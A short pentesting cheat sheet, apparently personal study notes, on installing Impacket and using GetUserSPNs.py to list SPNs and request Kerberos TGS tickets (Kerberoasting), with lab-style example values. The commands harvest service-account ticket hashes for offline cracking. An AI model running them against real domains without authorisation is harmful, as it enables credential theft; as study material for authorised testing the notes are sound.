---
title:  GetUserSPNs - a module from Impacket
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - kerberos
  - kerberoasting
---

# GetUserSPNs.py

## Installation

Install Impacket from: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

```bash
git clone https://github.com/fortra/impacket
cd impacket
sudo python3 -m pip install .
```


## Basic commands

```bash
# Gather a listing of SPNs in the domain.
GetUserSPNs.py -dc-ip $ip $domain/$username
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend


# Requesting all TGS Tickets
GetUserSPNs.py -dc-ip $ip $domain/$username -request 
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# Request a single TGS ticket:
GetUserSPNs.py -dc-ip $ip $domain/$username -request-user $userrequested -outputfile file_tgs
# -outputfile:  to write the TGS tickets to a file 
# Example:
# GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

